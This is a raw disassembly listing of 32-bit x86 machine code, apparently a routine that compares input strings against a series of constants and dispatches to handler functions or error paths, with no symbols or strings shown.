1314ba2c:	56                   	push   %esi
1314ba2d:	50                   	push   %eax
1314ba2e:	e8 25 c3 ff ff       	call   0x13147d58
1314ba33:	eb 78                	jmp    0x1314baad
1314ba35:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314ba3b:	68 30 17 15 13       	push   $0x13151730
1314ba40:	50                   	push   %eax
1314ba41:	e8 e6 6c ff ff       	call   0x1314272c
1314ba46:	59                   	pop    %ecx
1314ba47:	85 c0                	test   %eax,%eax
1314ba49:	59                   	pop    %ecx
1314ba4a:	75 69                	jne    0x1314bab5
1314ba4c:	e8 36 c9 ff ff       	call   0x13148387
1314ba51:	85 c0                	test   %eax,%eax
1314ba53:	74 0a                	je     0x1314ba5f
1314ba55:	68 18 17 15 13       	push   $0x13151718
1314ba5a:	e9 7d 0e 00 00       	jmp    0x1314c8dc
1314ba5f:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314ba65:	6a 01                	push   $0x1
1314ba67:	50                   	push   %eax
1314ba68:	57                   	push   %edi
1314ba69:	e8 04 9b ff ff       	call   0x13145572
1314ba6e:	83 c4 0c             	add    $0xc,%esp
1314ba71:	85 c0                	test   %eax,%eax
1314ba73:	74 0f                	je     0x1314ba84
1314ba75:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314ba7b:	50                   	push   %eax
1314ba7c:	e8 87 6d ff ff       	call   0x13142808
1314ba81:	59                   	pop    %ecx
1314ba82:	eb 05                	jmp    0x1314ba89
1314ba84:	a1 38 d3 14 13       	mov    0x1314d338,%eax
1314ba89:	85 c0                	test   %eax,%eax
1314ba8b:	a3 80 68 17 13       	mov    %eax,0x13176880
1314ba90:	75 11                	jne    0x1314baa3
1314ba92:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314ba98:	50                   	push   %eax
1314ba99:	68 00 17 15 13       	push   $0x13151700
1314ba9e:	e9 56 0e 00 00       	jmp    0x1314c8f9
1314baa3:	ff 75 08             	pushl  0x8(%ebp)
1314baa6:	56                   	push   %esi
1314baa7:	50                   	push   %eax
1314baa8:	e8 2c c8 ff ff       	call   0x131482d9
1314baad:	83 c4 0c             	add    $0xc,%esp
1314bab0:	e9 77 0e 00 00       	jmp    0x1314c92c
1314bab5:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314babb:	68 f4 16 15 13       	push   $0x131516f4
1314bac0:	50                   	push   %eax
1314bac1:	e8 66 6c ff ff       	call   0x1314272c
1314bac6:	59                   	pop    %ecx
1314bac7:	85 c0                	test   %eax,%eax
1314bac9:	59                   	pop    %ecx
1314baca:	75 26                	jne    0x1314baf2
1314bacc:	e8 35 c3 ff ff       	call   0x13147e06
1314bad1:	85 c0                	test   %eax,%eax
1314bad3:	75 0a                	jne    0x1314badf
1314bad5:	68 dc 16 15 13       	push   $0x131516dc
1314bada:	e9 fd 0d 00 00       	jmp    0x1314c8dc
1314badf:	6a 01                	push   $0x1
1314bae1:	e8 de c2 ff ff       	call   0x13147dc4
1314bae6:	c7 04 24 cc 16 15 13 	movl   $0x131516cc,(%esp)
1314baed:	e9 ea 0d 00 00       	jmp    0x1314c8dc
1314baf2:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314baf8:	68 c0 16 15 13       	push   $0x131516c0
1314bafd:	50                   	push   %eax
1314bafe:	e8 29 6c ff ff       	call   0x1314272c
1314bb03:	59                   	pop    %ecx
1314bb04:	85 c0                	test   %eax,%eax
1314bb06:	59                   	pop    %ecx
1314bb07:	75 26                	jne    0x1314bb2f
1314bb09:	e8 79 c8 ff ff       	call   0x13148387
1314bb0e:	85 c0                	test   %eax,%eax
1314bb10:	75 0a                	jne    0x1314bb1c
1314bb12:	68 a8 16 15 13       	push   $0x131516a8
1314bb17:	e9 c0 0d 00 00       	jmp    0x1314c8dc
1314bb1c:	6a 01                	push   $0x1
1314bb1e:	e8 22 c8 ff ff       	call   0x13148345
1314bb23:	c7 04 24 98 16 15 13 	movl   $0x13151698,(%esp)
1314bb2a:	e9 ad 0d 00 00       	jmp    0x1314c8dc
1314bb2f:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bb35:	68 90 16 15 13       	push   $0x13151690
1314bb3a:	50                   	push   %eax
1314bb3b:	e8 ec 6b ff ff       	call   0x1314272c
1314bb40:	59                   	pop    %ecx
1314bb41:	85 c0                	test   %eax,%eax
1314bb43:	59                   	pop    %ecx
1314bb44:	75 12                	jne    0x1314bb58
1314bb46:	6a 01                	push   $0x1
1314bb48:	e8 23 dc ff ff       	call   0x13149770
1314bb4d:	50                   	push   %eax
1314bb4e:	68 7c 16 15 13       	push   $0x1315167c
1314bb53:	e9 5b e7 ff ff       	jmp    0x1314a2b3
1314bb58:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bb5e:	68 74 16 15 13       	push   $0x13151674
1314bb63:	50                   	push   %eax
1314bb64:	e8 c3 6b ff ff       	call   0x1314272c
1314bb69:	59                   	pop    %ecx
1314bb6a:	85 c0                	test   %eax,%eax
1314bb6c:	59                   	pop    %ecx
1314bb6d:	75 66                	jne    0x1314bbd5
1314bb6f:	e8 fd 88 ff ff       	call   0x13144471
1314bb74:	85 c0                	test   %eax,%eax
1314bb76:	74 0a                	je     0x1314bb82
1314bb78:	68 5c 16 15 13       	push   $0x1315165c
1314bb7d:	e9 5a 0d 00 00       	jmp    0x1314c8dc
1314bb82:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bb88:	6a 01                	push   $0x1
1314bb8a:	50                   	push   %eax
1314bb8b:	57                   	push   %edi
1314bb8c:	e8 e1 99 ff ff       	call   0x13145572
1314bb91:	83 c4 0c             	add    $0xc,%esp
1314bb94:	85 c0                	test   %eax,%eax
1314bb96:	74 0f                	je     0x1314bba7
1314bb98:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bb9e:	50                   	push   %eax
1314bb9f:	e8 64 6c ff ff       	call   0x13142808
1314bba4:	59                   	pop    %ecx
1314bba5:	eb 05                	jmp    0x1314bbac
1314bba7:	a1 40 d3 14 13       	mov    0x1314d340,%eax
1314bbac:	85 c0                	test   %eax,%eax
1314bbae:	a3 60 7a 17 13       	mov    %eax,0x13177a60
1314bbb3:	75 11                	jne    0x1314bbc6
1314bbb5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bbbb:	50                   	push   %eax
1314bbbc:	68 48 16 15 13       	push   $0x13151648
1314bbc1:	e9 33 0d 00 00       	jmp    0x1314c8f9
1314bbc6:	ff 75 08             	pushl  0x8(%ebp)
1314bbc9:	56                   	push   %esi
1314bbca:	50                   	push   %eax
1314bbcb:	e8 f1 87 ff ff       	call   0x131443c1
1314bbd0:	e9 31 0d 00 00       	jmp    0x1314c906
1314bbd5:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bbdb:	68 3c 16 15 13       	push   $0x1315163c
1314bbe0:	50                   	push   %eax
1314bbe1:	e8 46 6b ff ff       	call   0x1314272c
1314bbe6:	59                   	pop    %ecx
1314bbe7:	85 c0                	test   %eax,%eax
1314bbe9:	59                   	pop    %ecx
1314bbea:	75 26                	jne    0x1314bc12
1314bbec:	e8 80 88 ff ff       	call   0x13144471
1314bbf1:	85 c0                	test   %eax,%eax
1314bbf3:	75 0a                	jne    0x1314bbff
1314bbf5:	68 28 16 15 13       	push   $0x13151628
1314bbfa:	e9 dd 0c 00 00       	jmp    0x1314c8dc
1314bbff:	6a 01                	push   $0x1
1314bc01:	e8 29 88 ff ff       	call   0x1314442f
1314bc06:	c7 04 24 18 16 15 13 	movl   $0x13151618,(%esp)
1314bc0d:	e9 ca 0c 00 00       	jmp    0x1314c8dc
1314bc12:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bc18:	68 10 16 15 13       	push   $0x13151610
1314bc1d:	50                   	push   %eax
1314bc1e:	e8 09 6b ff ff       	call   0x1314272c
1314bc23:	59                   	pop    %ecx
1314bc24:	85 c0                	test   %eax,%eax
1314bc26:	59                   	pop    %ecx
1314bc27:	0f 85 b0 00 00 00    	jne    0x1314bcdd
1314bc2d:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bc33:	6a 01                	push   $0x1
1314bc35:	50                   	push   %eax
1314bc36:	57                   	push   %edi
1314bc37:	e8 36 99 ff ff       	call   0x13145572
1314bc3c:	83 c4 0c             	add    $0xc,%esp
1314bc3f:	85 c0                	test   %eax,%eax
1314bc41:	74 0f                	je     0x1314bc52
1314bc43:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bc49:	50                   	push   %eax
1314bc4a:	e8 b9 6b ff ff       	call   0x13142808
1314bc4f:	59                   	pop    %ecx
1314bc50:	eb 05                	jmp    0x1314bc57
1314bc52:	b8 e8 03 00 00       	mov    $0x3e8,%eax
1314bc57:	85 c0                	test   %eax,%eax
1314bc59:	a3 0c 67 17 13       	mov    %eax,0x1317670c
1314bc5e:	75 11                	jne    0x1314bc71
1314bc60:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bc66:	50                   	push   %eax
1314bc67:	68 fc 15 15 13       	push   $0x131515fc
1314bc6c:	e9 88 0c 00 00       	jmp    0x1314c8f9
1314bc71:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bc77:	6a 02                	push   $0x2
1314bc79:	50                   	push   %eax
1314bc7a:	57                   	push   %edi
1314bc7b:	e8 f2 98 ff ff       	call   0x13145572
1314bc80:	83 c4 0c             	add    $0xc,%esp
1314bc83:	85 c0                	test   %eax,%eax
1314bc85:	74 0f                	je     0x1314bc96
1314bc87:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bc8d:	50                   	push   %eax
1314bc8e:	e8 75 6b ff ff       	call   0x13142808
1314bc93:	59                   	pop    %ecx
1314bc94:	eb 05                	jmp    0x1314bc9b
1314bc96:	b8 f4 01 00 00       	mov    $0x1f4,%eax
1314bc9b:	85 c0                	test   %eax,%eax
1314bc9d:	a3 78 a5 17 13       	mov    %eax,0x1317a578
1314bca2:	75 11                	jne    0x1314bcb5
1314bca4:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bcaa:	50                   	push   %eax
1314bcab:	68 e8 15 15 13       	push   $0x131515e8
1314bcb0:	e9 44 0c 00 00       	jmp    0x1314c8f9
1314bcb5:	3d d0 07 00 00       	cmp    $0x7d0,%eax
1314bcba:	50                   	push   %eax
1314bcbb:	76 0a                	jbe    0x1314bcc7
1314bcbd:	68 c8 15 15 13       	push   $0x131515c8
1314bcc2:	e9 32 0c 00 00       	jmp    0x1314c8f9
1314bcc7:	ff 35 0c 67 17 13    	pushl  0x1317670c
1314bccd:	ff 15 f0 36 15 13    	call   *0x131536f0
1314bcd3:	68 c0 15 15 13       	push   $0x131515c0
1314bcd8:	e9 ff 0b 00 00       	jmp    0x1314c8dc
1314bcdd:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bce3:	68 b4 15 15 13       	push   $0x131515b4
1314bce8:	50                   	push   %eax
1314bce9:	e8 3e 6a ff ff       	call   0x1314272c
1314bcee:	59                   	pop    %ecx
1314bcef:	85 c0                	test   %eax,%eax
1314bcf1:	59                   	pop    %ecx
1314bcf2:	0f 85 f2 00 00 00    	jne    0x1314bdea
1314bcf8:	e8 5f 8a ff ff       	call   0x1314475c
1314bcfd:	85 c0                	test   %eax,%eax
1314bcff:	74 0a                	je     0x1314bd0b
1314bd01:	68 94 15 15 13       	push   $0x13151594
1314bd06:	e9 d1 0b 00 00       	jmp    0x1314c8dc
1314bd0b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bd11:	6a 01                	push   $0x1
1314bd13:	50                   	push   %eax
1314bd14:	57                   	push   %edi
1314bd15:	e8 58 98 ff ff       	call   0x13145572
1314bd1a:	83 c4 0c             	add    $0xc,%esp
1314bd1d:	85 c0                	test   %eax,%eax
1314bd1f:	75 0a                	jne    0x1314bd2b
1314bd21:	68 60 15 15 13       	push   $0x13151560
1314bd26:	e9 b1 0b 00 00       	jmp    0x1314c8dc
1314bd2b:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bd31:	6a 02                	push   $0x2
1314bd33:	50                   	push   %eax
1314bd34:	57                   	push   %edi
1314bd35:	e8 38 98 ff ff       	call   0x13145572
1314bd3a:	83 c4 0c             	add    $0xc,%esp
1314bd3d:	85 c0                	test   %eax,%eax
1314bd3f:	74 0f                	je     0x1314bd50
1314bd41:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bd47:	50                   	push   %eax
1314bd48:	e8 bb 6a ff ff       	call   0x13142808
1314bd4d:	59                   	pop    %ecx
1314bd4e:	eb 05                	jmp    0x1314bd55
1314bd50:	a1 20 d3 14 13       	mov    0x1314d320,%eax
1314bd55:	85 c0                	test   %eax,%eax
1314bd57:	a3 a0 6a 17 13       	mov    %eax,0x13176aa0
1314bd5c:	75 11                	jne    0x1314bd6f
1314bd5e:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314bd64:	50                   	push   %eax
1314bd65:	68 44 15 15 13       	push   $0x13151544
1314bd6a:	e9 8a 0b 00 00       	jmp    0x1314c8f9
1314bd6f:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314bd75:	68 2c 15 15 13       	push   $0x1315152c
1314bd7a:	50                   	push   %eax
1314bd7b:	ff 15 98 39 15 13    	call   *0x13153998
1314bd81:	59                   	pop    %ecx
1314bd82:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314bd88:	59                   	pop    %ecx
1314bd89:	ff 75 08             	pushl  0x8(%ebp)
1314bd8c:	b9 81 01 00 00       	mov    $0x181,%ecx
1314bd91:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314bd97:	8b fc                	mov    %esp,%edi
1314bd99:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314bd9b:	e8 4c cd ff ff       	call   0x13148aec
1314bda0:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314bda6:	6a 03                	push   $0x3
1314bda8:	50                   	push   %eax
1314bda9:	ff 75 fc             	pushl  -0x4(%ebp)
1314bdac:	e8 c1 97 ff ff       	call   0x13145572
1314bdb1:	81 c4 14 06 00 00    	add    $0x614,%esp
1314bdb7:	85 c0                	test   %eax,%eax
1314bdb9:	ff 75 08             	pushl  0x8(%ebp)
1314bdbc:	8d 83 64 75 17 13    	lea    0x13177564(%ebx),%eax
1314bdc2:	50                   	push   %eax
1314bdc3:	74 21                	je     0x1314bde6
1314bdc5:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314bdcb:	50                   	push   %eax
1314bdcc:	ff 35 a0 6a 17 13    	pushl  0x13176aa0
1314bdd2:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bdd8:	50                   	push   %eax
1314bdd9:	e8 ad 88 ff ff       	call   0x1314468b
1314bdde:	83 c4 14             	add    $0x14,%esp
1314bde1:	e9 46 0b 00 00       	jmp    0x1314c92c
1314bde6:	6a 00                	push   $0x0
1314bde8:	eb e2                	jmp    0x1314bdcc
1314bdea:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bdf0:	68 1c 15 15 13       	push   $0x1315151c
1314bdf5:	50                   	push   %eax
1314bdf6:	e8 31 69 ff ff       	call   0x1314272c
1314bdfb:	59                   	pop    %ecx
1314bdfc:	85 c0                	test   %eax,%eax
1314bdfe:	59                   	pop    %ecx
1314bdff:	75 26                	jne    0x1314be27
1314be01:	e8 56 89 ff ff       	call   0x1314475c
1314be06:	85 c0                	test   %eax,%eax
1314be08:	75 0a                	jne    0x1314be14
1314be0a:	68 00 15 15 13       	push   $0x13151500
1314be0f:	e9 c8 0a 00 00       	jmp    0x1314c8dc
1314be14:	6a 01                	push   $0x1
1314be16:	e8 29 89 ff ff       	call   0x13144744
1314be1b:	c7 04 24 e8 14 15 13 	movl   $0x131514e8,(%esp)
1314be22:	e9 b5 0a 00 00       	jmp    0x1314c8dc
1314be27:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314be2d:	68 e0 14 15 13       	push   $0x131514e0
1314be32:	50                   	push   %eax
1314be33:	e8 f4 68 ff ff       	call   0x1314272c
1314be38:	59                   	pop    %ecx
1314be39:	85 c0                	test   %eax,%eax
1314be3b:	59                   	pop    %ecx
1314be3c:	0f 85 8d 00 00 00    	jne    0x1314becf
1314be42:	39 05 90 a5 17 13    	cmp    %eax,0x1317a590
1314be48:	74 37                	je     0x1314be81
1314be4a:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314be50:	68 58 68 17 13       	push   $0x13176858
1314be55:	50                   	push   %eax
1314be56:	ff 15 98 39 15 13    	call   *0x13153998
1314be5c:	59                   	pop    %ecx
1314be5d:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314be63:	59                   	pop    %ecx
1314be64:	ff 75 08             	pushl  0x8(%ebp)
1314be67:	b9 81 01 00 00       	mov    $0x181,%ecx
1314be6c:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314be72:	8b fc                	mov    %esp,%edi
1314be74:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314be76:	e8 71 cc ff ff       	call   0x13148aec
1314be7b:	81 c4 08 06 00 00    	add    $0x608,%esp
1314be81:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314be87:	6a 01                	push   $0x1
1314be89:	50                   	push   %eax
1314be8a:	ff 75 fc             	pushl  -0x4(%ebp)
1314be8d:	e8 e0 96 ff ff       	call   0x13145572
1314be92:	83 c4 0c             	add    $0xc,%esp
1314be95:	85 c0                	test   %eax,%eax
1314be97:	75 0a                	jne    0x1314bea3
1314be99:	68 c0 14 15 13       	push   $0x131514c0
1314be9e:	e9 39 0a 00 00       	jmp    0x1314c8dc
1314bea3:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bea9:	50                   	push   %eax
1314beaa:	e8 92 9b ff ff       	call   0x13145a41
1314beaf:	85 c0                	test   %eax,%eax
1314beb1:	59                   	pop    %ecx
1314beb2:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314beb8:	50                   	push   %eax
1314beb9:	75 0a                	jne    0x1314bec5
1314bebb:	68 9c 14 15 13       	push   $0x1315149c
1314bec0:	e9 34 0a 00 00       	jmp    0x1314c8f9
1314bec5:	68 84 14 15 13       	push   $0x13151484
1314beca:	e9 2a 0a 00 00       	jmp    0x1314c8f9
1314becf:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bed5:	68 7c 14 15 13       	push   $0x1315147c
1314beda:	50                   	push   %eax
1314bedb:	e8 4c 68 ff ff       	call   0x1314272c
1314bee0:	59                   	pop    %ecx
1314bee1:	85 c0                	test   %eax,%eax
1314bee3:	59                   	pop    %ecx
1314bee4:	0f 85 95 00 00 00    	jne    0x1314bf7f
1314beea:	39 05 90 a5 17 13    	cmp    %eax,0x1317a590
1314bef0:	74 37                	je     0x1314bf29
1314bef2:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314bef8:	68 58 68 17 13       	push   $0x13176858
1314befd:	50                   	push   %eax
1314befe:	ff 15 98 39 15 13    	call   *0x13153998
1314bf04:	59                   	pop    %ecx
1314bf05:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314bf0b:	59                   	pop    %ecx
1314bf0c:	ff 75 08             	pushl  0x8(%ebp)
1314bf0f:	b9 81 01 00 00       	mov    $0x181,%ecx
1314bf14:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314bf1a:	8b fc                	mov    %esp,%edi
1314bf1c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314bf1e:	e8 c9 cb ff ff       	call   0x13148aec
1314bf23:	81 c4 08 06 00 00    	add    $0x608,%esp
1314bf29:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bf2f:	6a 01                	push   $0x1
1314bf31:	50                   	push   %eax
1314bf32:	ff 75 fc             	pushl  -0x4(%ebp)
1314bf35:	e8 38 96 ff ff       	call   0x13145572
1314bf3a:	83 c4 0c             	add    $0xc,%esp
1314bf3d:	85 c0                	test   %eax,%eax
1314bf3f:	75 0a                	jne    0x1314bf4b
1314bf41:	68 5c 14 15 13       	push   $0x1315145c
1314bf46:	e9 91 09 00 00       	jmp    0x1314c8dc
1314bf4b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bf51:	50                   	push   %eax
1314bf52:	e8 d4 96 ff ff       	call   0x1314562b
1314bf57:	85 c0                	test   %eax,%eax
1314bf59:	59                   	pop    %ecx
1314bf5a:	75 11                	jne    0x1314bf6d
1314bf5c:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bf62:	50                   	push   %eax
1314bf63:	68 38 14 15 13       	push   $0x13151438
1314bf68:	e9 8c 09 00 00       	jmp    0x1314c8f9
1314bf6d:	50                   	push   %eax
1314bf6e:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bf74:	50                   	push   %eax
1314bf75:	68 1c 14 15 13       	push   $0x1315141c
1314bf7a:	e9 34 e3 ff ff       	jmp    0x1314a2b3
1314bf7f:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314bf85:	68 14 14 15 13       	push   $0x13151414
1314bf8a:	50                   	push   %eax
1314bf8b:	e8 9c 67 ff ff       	call   0x1314272c
1314bf90:	59                   	pop    %ecx
1314bf91:	85 c0                	test   %eax,%eax
1314bf93:	59                   	pop    %ecx
1314bf94:	0f 85 9e 00 00 00    	jne    0x1314c038
1314bf9a:	39 05 90 a5 17 13    	cmp    %eax,0x1317a590
1314bfa0:	74 37                	je     0x1314bfd9
1314bfa2:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314bfa8:	68 58 68 17 13       	push   $0x13176858
1314bfad:	50                   	push   %eax
1314bfae:	ff 15 98 39 15 13    	call   *0x13153998
1314bfb4:	59                   	pop    %ecx
1314bfb5:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314bfbb:	59                   	pop    %ecx
1314bfbc:	ff 75 08             	pushl  0x8(%ebp)
1314bfbf:	b9 81 01 00 00       	mov    $0x181,%ecx
1314bfc4:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314bfca:	8b fc                	mov    %esp,%edi
1314bfcc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314bfce:	e8 19 cb ff ff       	call   0x13148aec
1314bfd3:	81 c4 08 06 00 00    	add    $0x608,%esp
1314bfd9:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314bfdf:	6a 01                	push   $0x1
1314bfe1:	50                   	push   %eax
1314bfe2:	ff 75 fc             	pushl  -0x4(%ebp)
1314bfe5:	e8 88 95 ff ff       	call   0x13145572
1314bfea:	83 c4 0c             	add    $0xc,%esp
1314bfed:	85 c0                	test   %eax,%eax
1314bfef:	75 0a                	jne    0x1314bffb
1314bff1:	68 00 14 15 13       	push   $0x13151400
1314bff6:	e9 e1 08 00 00       	jmp    0x1314c8dc
1314bffb:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c001:	50                   	push   %eax
1314c002:	e8 01 68 ff ff       	call   0x13142808
1314c007:	8b f0                	mov    %eax,%esi
1314c009:	59                   	pop    %ecx
1314c00a:	85 f6                	test   %esi,%esi
1314c00c:	75 0a                	jne    0x1314c018
1314c00e:	68 f0 13 15 13       	push   $0x131513f0
1314c013:	e9 c4 08 00 00       	jmp    0x1314c8dc
1314c018:	56                   	push   %esi
1314c019:	e8 ce 9a ff ff       	call   0x13145aec
1314c01e:	59                   	pop    %ecx
1314c01f:	85 c0                	test   %eax,%eax
1314c021:	56                   	push   %esi
1314c022:	75 0a                	jne    0x1314c02e
1314c024:	68 cc 13 15 13       	push   $0x131513cc
1314c029:	e9 cb 08 00 00       	jmp    0x1314c8f9
1314c02e:	68 b0 13 15 13       	push   $0x131513b0
1314c033:	e9 c1 08 00 00       	jmp    0x1314c8f9
1314c038:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c03e:	68 a4 13 15 13       	push   $0x131513a4
1314c043:	50                   	push   %eax
1314c044:	e8 e3 66 ff ff       	call   0x1314272c
1314c049:	59                   	pop    %ecx
1314c04a:	85 c0                	test   %eax,%eax
1314c04c:	59                   	pop    %ecx
1314c04d:	0f 85 ad 00 00 00    	jne    0x1314c100
1314c053:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c059:	6a 01                	push   $0x1
1314c05b:	50                   	push   %eax
1314c05c:	57                   	push   %edi
1314c05d:	e8 10 95 ff ff       	call   0x13145572
1314c062:	83 c4 0c             	add    $0xc,%esp
1314c065:	85 c0                	test   %eax,%eax
1314c067:	0f 84 89 00 00 00    	je     0x1314c0f6
1314c06d:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c073:	6a 02                	push   $0x2
1314c075:	50                   	push   %eax
1314c076:	57                   	push   %edi
1314c077:	e8 f6 94 ff ff       	call   0x13145572
1314c07c:	83 c4 0c             	add    $0xc,%esp
1314c07f:	85 c0                	test   %eax,%eax
1314c081:	74 73                	je     0x1314c0f6
1314c083:	e8 41 c7 ff ff       	call   0x131487c9
1314c088:	85 c0                	test   %eax,%eax
1314c08a:	74 0a                	je     0x1314c096
1314c08c:	68 88 13 15 13       	push   $0x13151388
1314c091:	e9 46 08 00 00       	jmp    0x1314c8dc
1314c096:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c09c:	68 74 13 15 13       	push   $0x13151374
1314c0a1:	50                   	push   %eax
1314c0a2:	ff 15 98 39 15 13    	call   *0x13153998
1314c0a8:	59                   	pop    %ecx
1314c0a9:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c0af:	59                   	pop    %ecx
1314c0b0:	ff 75 08             	pushl  0x8(%ebp)
1314c0b3:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c0b8:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c0be:	8b fc                	mov    %esp,%edi
1314c0c0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c0c2:	e8 25 ca ff ff       	call   0x13148aec
1314c0c7:	81 c4 08 06 00 00    	add    $0x608,%esp
1314c0cd:	8d 83 64 75 17 13    	lea    0x13177564(%ebx),%eax
1314c0d3:	ff 75 08             	pushl  0x8(%ebp)
1314c0d6:	50                   	push   %eax
1314c0d7:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314c0dd:	50                   	push   %eax
1314c0de:	e8 25 67 ff ff       	call   0x13142808
1314c0e3:	59                   	pop    %ecx
1314c0e4:	50                   	push   %eax
1314c0e5:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c0eb:	50                   	push   %eax
1314c0ec:	e8 1f c6 ff ff       	call   0x13148710
1314c0f1:	e9 48 01 00 00       	jmp    0x1314c23e
1314c0f6:	68 54 13 15 13       	push   $0x13151354
1314c0fb:	e9 dc 07 00 00       	jmp    0x1314c8dc
1314c100:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c106:	68 44 13 15 13       	push   $0x13151344
1314c10b:	50                   	push   %eax
1314c10c:	e8 1b 66 ff ff       	call   0x1314272c
1314c111:	59                   	pop    %ecx
1314c112:	85 c0                	test   %eax,%eax
1314c114:	59                   	pop    %ecx
1314c115:	75 56                	jne    0x1314c16d
1314c117:	e8 ad c6 ff ff       	call   0x131487c9
1314c11c:	85 c0                	test   %eax,%eax
1314c11e:	75 0a                	jne    0x1314c12a
1314c120:	68 28 13 15 13       	push   $0x13151328
1314c125:	e9 b2 07 00 00       	jmp    0x1314c8dc
1314c12a:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314c130:	68 10 13 15 13       	push   $0x13151310
1314c135:	50                   	push   %eax
1314c136:	ff 15 98 39 15 13    	call   *0x13153998
1314c13c:	59                   	pop    %ecx
1314c13d:	8d b3 64 74 17 13    	lea    0x13177464(%ebx),%esi
1314c143:	59                   	pop    %ecx
1314c144:	ff 75 08             	pushl  0x8(%ebp)
1314c147:	b9 81 01 00 00       	mov    $0x181,%ecx
1314c14c:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314c152:	8b fc                	mov    %esp,%edi
1314c154:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314c156:	e8 91 c9 ff ff       	call   0x13148aec
1314c15b:	6a 01                	push   $0x1
1314c15d:	e8 43 c6 ff ff       	call   0x131487a5
1314c162:	81 c4 0c 06 00 00    	add    $0x60c,%esp
1314c168:	e9 bf 07 00 00       	jmp    0x1314c92c
1314c16d:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314c173:	68 04 13 15 13       	push   $0x13151304
1314c178:	50                   	push   %eax
1314c179:	e8 ae 65 ff ff       	call   0x1314272c
1314c17e:	59                   	pop    %ecx
1314c17f:	85 c0                	test   %eax,%eax
1314c181:	59                   	pop    %ecx
1314c182:	0f 85 be 00 00 00    	jne    0x1314c246
1314c188:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314c18e:	6a 01                	push   $0x1
1314c190:	50                   	push   %eax
1314c191:	57                   	push   %edi
1314c192:	e8 db 93 ff ff       	call   0x13145572
1314c197:	83 c4 0c             	add    $0xc,%esp
1314c19a:	85 c0                	test   %eax,%eax
1314c19c:	75 0a                	jne    0x1314c1a8
1314c19e:	68 e4 12 15 13       	push   $0x131512e4
